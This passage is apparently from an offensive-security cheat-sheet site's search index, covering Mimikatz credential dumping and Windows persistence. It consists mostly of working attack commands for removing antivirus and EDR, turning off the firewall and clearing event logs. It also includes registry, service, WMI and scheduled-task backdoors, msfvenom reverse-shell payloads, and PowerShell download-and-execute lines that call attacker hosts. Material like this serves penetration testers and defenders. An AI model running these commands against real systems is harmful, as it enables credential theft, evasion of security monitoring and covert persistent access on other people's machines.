Credential in Chrome\ndpapi::chrome /in:\"%localappdata%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#task-scheduled-credentials","title":"Task Scheduled credentials","text":"<pre><code>mimikatz(commandline) # vault::cred /patch\nTargetName : Domain:batch=TaskScheduler:Task:{CF3ABC3E-4B17-ABCD-0003-A1BA192CDD0B} / &lt;NULL&gt;\nUserName   : DOMAIN\\user\nComment    : &lt;NULL&gt;\nType       : 2 - domain_password\nPersist    : 2 - local_machine\nFlags      : 00004004\nCredential : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nAttributes : 0\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#vault","title":"Vault","text":"<pre><code>vault::cred /in:C:\\Users\\demo\\AppData\\Local\\Microsoft\\Vault\\\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#commands-list","title":"Commands list","text":"Command Definition CRYPTO::Certificates list/export certificates CRYPTO::Certificates list/export certificates KERBEROS::Golden create golden/silver/trust tickets KERBEROS::List list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user\u2019s tickets.Similar to functionality of \u201cklist\u201d. KERBEROS::PTT pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust). LSADUMP::DCSync ask a DC to synchronize an object (get password data for account). No need to run code on DC. LSADUMP::LSA Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: \u201c/name:krbtgt\u201d LSADUMP::SAM get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer. LSADUMP::Trust Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest). MISC::AddSid Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016. MISC::MemSSP Inject a malicious Windows SSP to log locally authenticated credentials. MISC::Skeleton Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a \u201cmaster password\u201d (aka Skeleton Keys) as well as their usual password. PRIVILEGE::Debug get debug rights (this or Local System rights is required for many Mimikatz commands). SEKURLSA::Ekeys list Kerberos encryption keys SEKURLSA::Kerberos List Kerberos credentials for all authenticated users (including services and computer account) SEKURLSA::Krbtgt get Domain Kerberos service account (KRBTGT)password data SEKURLSA::LogonPasswords lists all available provider credentials. This usually shows recently logged on user and computer credentials. SEKURLSA::Pth Pass- theHash and Over-Pass-the-Hash SEKURLSA::Tickets Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer\u2019s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users). TOKEN::List list all tokens of the system TOKEN::Elevate impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box TOKEN::Elevate /domainadmin impersonate a token with Domain Admin credentials."},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#powershell-version","title":"Powershell version","text":"<p>Mimikatz in memory (no binary on disk) with :</p> <ul> <li>Invoke-Mimikatz from PowerShellEmpire</li> <li>Invoke-Mimikatz from PowerSploit</li> </ul> <p>More information can be grabbed from the Memory with :</p> <ul> <li>Invoke-Mimikittenz</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Mimikatz/#references","title":"References","text":"<ul> <li>Unofficial Guide to Mimikatz &amp; Command Reference</li> <li>Skeleton Key</li> <li>Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH</li> <li>Dumping RDP Credentials - MAY 24, 2021</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/","title":"Windows - Persistence","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Hide Your Binary</li> <li>Disable Antivirus and Security<ul> <li>Antivirus Removal</li> <li>Disable Windows Defender</li> <li>Disable Windows Firewall</li> <li>Clear System and Security Logs</li> </ul> </li> <li>Simple User<ul> <li>Registry HKCU</li> <li>Startup</li> <li>Scheduled Tasks User</li> <li>BITS Jobs</li> </ul> </li> <li>Serviceland<ul> <li>IIS</li> <li>Windows Service</li> </ul> </li> <li>Elevated<ul> <li>Registry HKLM<ul> <li>Winlogon Helper DLL</li> <li>GlobalFlag</li> </ul> </li> <li>Startup Elevated</li> <li>Services Elevated</li> <li>Scheduled Tasks Elevated</li> <li>Binary Replacement<ul> <li>Binary Replacement on Windows XP+</li> <li>Binary Replacement on Windows 10+</li> </ul> </li> <li>RDP Backdoor<ul> <li>utilman.exe</li> <li>sethc.exe</li> </ul> </li> <li>Remote Desktop Services Shadowing</li> <li>Skeleton Key</li> <li>Virtual Machines</li> <li>Windows Subsystem for Linux</li> </ul> </li> <li>Domain<ul> <li>Golden Certificate</li> <li>Golden Ticket</li> </ul> </li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#tools","title":"Tools","text":"<ul> <li>SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r</li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#hide-your-binary","title":"Hide Your Binary","text":"<p>Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.</p> <pre><code>PS&gt; attrib +h mimikatz.exe\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disable-antivirus-and-security","title":"Disable Antivirus and Security","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#antivirus-removal","title":"Antivirus Removal","text":"<ul> <li>Sophos Removal Tool.ps1</li> <li>Symantec CleanWipe</li> <li>Elastic EDR/Security <pre><code>cd \"C:\\Program Files\\Elastic\\Agent\\\"\nPS C:\\Program Files\\Elastic\\Agent&gt; .\\elastic-agent.exe uninstall\nElastic Agent will be uninstalled from your system at C:\\Program Files\\Elastic\\Agent. Do you want to continue? [Y/n]:Y\nElastic Agent has been uninstalled.\n</code></pre></li> <li>Cortex XDR <pre><code># Global uninstall password: Password1\nPassword hash is located in C:\\ProgramData\\Cyvera\\LocalSystem\\Persistence\\agent_settings.db\nLook for PasswordHash, PasswordSalt or password, salt strings.\n# Disable Cortex: Change the DLL to a random value, then REBOOT\nreg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CryptSvc\\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f\n# Disables the agent on startup (requires reboot to work)\ncytool.exe startup disable\n# Disables protection on Cortex XDR files, processes, registry and services\ncytool.exe protect disable\n# Disables Cortex XDR (Even with tamper protection enabled)\ncytool.exe runtime disable\n# Disables event collection\ncytool.exe event_collection disable\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disable-windows-defender","title":"Disable Windows Defender","text":"<pre><code># Disable Defender\nsc config WinDefend start= disabled\nsc stop WinDefend\nSet-MpPreference -DisableRealtimeMonitoring $true\n## Exclude a process / location\nSet-MpPreference -ExclusionProcess \"word.exe\", \"vmwp.exe\"\nAdd-MpPreference -ExclusionProcess 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'\nAdd-MpPreference -ExclusionPath C:\\Video, C:\\install\n# Disable scanning all downloaded files and attachments, disable AMSI (reactive)\nPS C:\\&gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus\nPS C:\\&gt; Set-MpPreference -DisableIOAVProtection $true\n# Disable AMSI (set to 0 to enable)\nPS C:\\&gt; Set-MpPreference -DisableScriptScanning 1 \n# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f\n# Wipe currently stored definitions\n# Location of MpCmdRun.exe: C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\&lt;antimalware platform version&gt;\nMpCmdRun.exe -RemoveDefinitions -All\n# Remove signatures (if Internet connection is present, they will be downloaded again):\nPS &gt; &amp; \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" -RemoveDefinitions -All\nPS &gt; &amp; \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n# Disable Windows Defender Security Center\nreg add \"HKLM\\System\\CurrentControlSet\\Services\\SecurityHealthService\" /v \"Start\" /t REG_DWORD /d \"4\" /f\n# Disable Real Time Protection\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#disable-windows-firewall","title":"Disable Windows Firewall","text":"<pre><code>Netsh Advfirewall show allprofiles\nNetSh Advfirewall set allprofiles state off\n# ip whitelisting\nNew-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#clear-system-and-security-logs","title":"Clear System and Security Logs","text":"<pre><code>cmd.exe /c wevtutil.exe cl System\ncmd.exe /c wevtutil.exe cl Security\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#simple-user","title":"Simple User","text":"<p>Set a file as hidden</p> <pre><code>attrib +h c:\\autoexec.bat\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#registry-hkcu","title":"Registry HKCU","text":"<p>Create a REG_SZ value in the Run key within HKCU\\Software\\Microsoft\\Windows.</p> <pre><code>Value name:  Backdoor\nValue data:  C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\n</code></pre> <p>Using the command line </p> <pre><code>reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Evil /t REG_SZ /d \"C:\\Users\\user\\backdoor.exe\"\n</code></pre> <p>Using SharPersist</p> <pre><code>SharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add\nSharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"hkcurun\" -v \"Test Stuff\" -m add -o env\nSharPersist -t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -k \"logonscript\" -m add\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#startup","title":"Startup","text":"<p>Create a batch script in the user startup folder.</p> <pre><code>PS C:\\&gt; gc C:\\Users\\Rasta\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.bat\nstart /b C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\n</code></pre> <p>Using SharPersist</p> <pre><code>SharPersist -t startupfolder -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -f \"Some File\" -m add\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#scheduled-tasks-user","title":"Scheduled Tasks User","text":"<ul> <li>Using native schtask - Create a new task     <pre><code># Create the scheduled tasks to run once at 00.00\nschtasks /create /sc ONCE /st 00:00 /tn \"Device-Synchronize\" /tr C:\\Temp\\revshell.exe\n# Force run it now !\nschtasks /run /tn \"Device-Synchronize\"\n</code></pre></li> <li> <p>Using native schtask - Leverage the <code>schtasks /change</code> command to modify existing scheduled tasks     <pre><code># Launch an executable by calling the ShellExec_RunDLL function.\nSCHTASKS /Change /tn \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" /TR \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE\n</code></pre></p> </li> <li> <p>Using Powershell     <pre><code>PS C:\\&gt; $A = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c C:\\Users\\Rasta\\AppData\\Local\\Temp\\backdoor.exe\"\nPS C:\\&gt; $T = New-ScheduledTaskTrigger -AtLogOn -User \"Rasta\"\nPS C:\\&gt; $P = New-ScheduledTaskPrincipal \"Rasta\"\nPS C:\\&gt; $S = New-ScheduledTaskSettingsSet\nPS C:\\&gt; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S\nPS C:\\&gt; Register-ScheduledTask Backdoor -InputObject $D\n</code></pre></p> </li> <li> <p>Using SharPersist     <pre><code># Add to a current scheduled task\nSharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add\n# Add new task\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add\nSharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#bits-jobs","title":"BITS Jobs","text":"<pre><code>bitsadmin /create backdoor\nbitsadmin /addfile backdoor \"http://10.10.10.10/evil.exe\"  \"C:\\tmp\\evil.exe\"\n# v1\nbitsadmin /SetNotifyCmdLine backdoor C:\\tmp\\evil.exe NUL\nbitsadmin /SetMinRetryDelay \"backdoor\" 60\nbitsadmin /resume backdoor\n# v2 - exploit/multi/script/web_delivery\nbitsadmin /SetNotifyCmdLine backdoor regsvr32.exe \"/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll\"\nbitsadmin /resume backdoor\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#serviceland","title":"Serviceland","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#iis","title":"IIS","text":"<p>IIS Raid \u2013 Backdooring IIS Using Native Modules</p> <pre><code>$ git clone https://github.com/0x09AL/IIS-Raid\n$ python iis_controller.py --url http://192.168.1.11/ --password SIMPLEPASS\nC:\\Windows\\system32\\inetsrv\\APPCMD.EXE install module /name:Module Name /image:\"%windir%\\System32\\inetsrv\\IIS-Backdoor.dll\" /add:true\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#windows-service","title":"Windows Service","text":"<p>Using SharPersist</p> <pre><code>SharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#elevated","title":"Elevated","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#registry-hklm","title":"Registry HKLM","text":"<p>Similar to HKCU. Create a REG_SZ value in the Run key within HKLM\\Software\\Microsoft\\Windows.</p> <pre><code>Value name:  Backdoor\nValue data:  C:\\Windows\\Temp\\backdoor.exe\n</code></pre> <p>Using the command line </p> <pre><code>reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\nreg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" /v Evil /t REG_SZ /d \"C:\\tmp\\backdoor.exe\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#winlogon-helper-dll","title":"Winlogon Helper DLL","text":"<p>Run executable during Windows logon</p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe &gt; evilbinary.exe\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll &gt; evilbinary.dll\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /d \"Userinit.exe, evilbinary.exe\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /d \"explorer.exe, evilbinary.exe\" /f\nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, evilbinary.exe\" -Force\nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, evilbinary.exe\" -Force\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#globalflag","title":"GlobalFlag","text":"<p>Run executable after notepad is killed</p> <pre><code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#startup-elevated","title":"Startup Elevated","text":"<p>Create a batch script in the user startup folder.</p> <pre><code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp \n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#services-elevated","title":"Services Elevated","text":"<p>Create a service that will start automatically or on-demand.</p> <pre><code># Powershell\nNew-Service -Name \"Backdoor\" -BinaryPathName \"C:\\Windows\\Temp\\backdoor.exe\" -Description \"Nothing to see here.\" -StartupType Automatic\nsc start pentestlab\n# SharPersist\nSharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c backdoor.exe\" -n \"Backdoor\" -m add\n# sc\nsc create Backdoor binpath= \"cmd.exe /k C:\\temp\\backdoor.exe\" start=\"auto\" obj=\"LocalSystem\"\nsc start Backdoor\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#scheduled-tasks-elevated","title":"Scheduled Tasks Elevated","text":"<p>Scheduled Task to run as SYSTEM, everyday at 9am or on a specific day.</p> <p>Processes spawned as scheduled tasks have taskeng.exe process as their parent</p> <pre><code># Powershell\n$A = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c C:\\temp\\backdoor.exe\"\n$T = New-ScheduledTaskTrigger -Daily -At 9am\n# OR\n$T = New-ScheduledTaskTrigger -Daily -At \"9/30/2020 11:05:00 AM\"\n$P = New-ScheduledTaskPrincipal \"NT AUTHORITY\\SYSTEM\" -RunLevel Highest\n$S = New-ScheduledTaskSettingsSet\n$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S\nRegister-ScheduledTask \"Backdoor\" -InputObject $D\n# Native schtasks\nschtasks /create /sc minute /mo 1 /tn \"eviltask\" /tr C:\\tools\\shell.cmd /ru \"SYSTEM\"\nschtasks /create /sc minute /mo 1 /tn \"eviltask\" /tr calc /ru \"SYSTEM\" /s dc-mantvydas /u user /p password\nschtasks /Create /RU \"NT AUTHORITY\\SYSTEM\" /tn [TaskName] /tr \"regsvr32.exe -s \\\"C:\\Users\\*\\AppData\\Local\\Temp\\[payload].dll\\\"\" /SC ONCE /Z /ST [Time] /ET [Time]\n##(X86) - On User Login\nschtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onlogon /ru System\n##(X86) - On System Start\nschtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onstart /ru System\n##(X86) - On User Idle (30mins)\nschtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30\n##(X64) - On User Login\nschtasks /create /tn OfficeUpdaterA /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onlogon /ru System\n##(X64) - On System Start\nschtasks /create /tn OfficeUpdaterB /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onstart /ru System\n##(X64) - On User Idle (30mins)\nschtasks /create /tn OfficeUpdaterC /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'\" /sc onidle /i 30\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#windows-management-instrumentation-event-subscription","title":"Windows Management Instrumentation Event Subscription","text":"<p>An adversary can use Windows Management Instrumentation (WMI) to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.</p> <ul> <li>__EventFilter: Trigger (new process, failed logon etc.)</li> <li>EventConsumer: Perform Action (execute payload etc.)</li> <li>__FilterToConsumerBinding: Binds Filter and Consumer Classes</li> </ul> <pre><code># Using CMD : Execute a binary 60 seconds after Windows started\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"WMIPersist\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"WMIPersist\", ExecutablePath=\"C:\\Windows\\System32\\binary.exe\",CommandLineTemplate=\"C:\\Windows\\System32\\binary.exe\"\nwmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"WMIPersist\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"WMIPersist\\\"\"\n# Remove it\nGet-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='WMIPersist'\" | Remove-WmiObject -Verbose\n# Using Powershell (deploy)\n$FilterArgs = @{name='WMIPersist'; EventNameSpace='root\\CimV2'; QueryLanguage=\"WQL\"; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 60 AND TargetInstance.SystemUpTime &lt; 90\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n$ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\binary.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n# Using Powershell (remove)\n$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'WMIPersist'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'WMIPersist'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\"\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#binary-replacement","title":"Binary Replacement","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#binary-replacement-on-windows-xp","title":"Binary Replacement on Windows XP+","text":"Feature Executable Sticky Keys C:\\Windows\\System32\\sethc.exe Accessibility Menu C:\\Windows\\System32\\utilman.exe On-Screen Keyboard C:\\Windows\\System32\\osk.exe Magnifier C:\\Windows\\System32\\Magnify.exe Narrator C:\\Windows\\System32\\Narrator.exe Display Switcher C:\\Windows\\System32\\DisplaySwitch.exe App Switcher C:\\Windows\\System32\\AtBroker.exe <p>In Metasploit : <code>use post/windows/manage/sticky_keys</code></p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#binary-replacement-on-windows-10","title":"Binary Replacement on Windows 10+","text":"<p>Exploit a DLL hijacking vulnerability in the On-Screen Keyboard osk.exe executable.</p> <p>Create a malicious HID.dll in  <code>C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll</code>.</p>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#rdp-backdoor","title":"RDP Backdoor","text":""},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#utilmanexe","title":"utilman.exe","text":"<p>At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.</p> <pre><code>REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#sethcexe","title":"sethc.exe","text":"<p>Hit F5 a bunch of times when you are at the RDP login screen.</p> <pre><code>REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#remote-desktop-services-shadowing","title":"Remote Desktop Services Shadowing","text":"<p> FreeRDP and rdesktop don't support Remote Desktop Services Shadowing feature.</p> <p>Requirements: * RDP must be running</p> <pre><code>reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v Shadow /t REG_DWORD /d 4\n# 4 \u2013 View Session without user\u2019s permission.\n# Allowing remote connections to this computer\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# Disable UAC remote restriction\nreg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\nmstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt\n# /v parameter lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host;\n# /shadow parameter is used to specify the {SESSION_ID} value that is a shadowee\u2019s session ID;\n# /noconsentprompt parameter allows to bypass a shadowee\u2019s permission and shadow their session without their consent;\n# /prompt parameter is used to specify a user\u2019s credentials to connect to a remote host.\n</code></pre>"},{"location":"Methodology%20and%20Resources/Windows%20-%20Persistence/#skeleton-key","title":"Skeleton Key","text":"<p>Inject a master password into the LSASS process of a Domain Controller.</p> <p>Requirements: * Domain Administrator (SeDebugPrivilege) or <code>NTAUTHORITY\\SYSTEM</code></p> <pre><code># Execute the skeleton key attack\nmimikatz \"privilege::debug\" \"misc::skeleton\"\nInvoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName 